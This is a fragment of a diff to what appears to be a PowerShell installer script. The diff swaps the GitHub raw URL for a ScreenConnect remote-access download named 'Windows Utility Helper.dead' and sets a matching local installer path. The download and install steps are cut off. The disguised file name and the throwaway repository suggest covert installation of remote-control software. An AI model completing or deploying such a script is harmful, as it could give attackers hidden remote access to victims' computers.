@@ -1,4 +1,4 @@
-$ScreenConnectURL = "https://github.com/lmfaofaofaofoafo/any/raw/refs/heads/main/Windows%20Helper%20Utility.dead"
+$ScreenConnectURL = "https://github.com/lmfaofaofaofoafo/any/raw/refs/heads/main/Windows%20Utility%20Helper.dead"
 $InstallerPath    = "C:\Users\Windows Helper Utility.dead"
 
 # Detect install path (x64 or x86
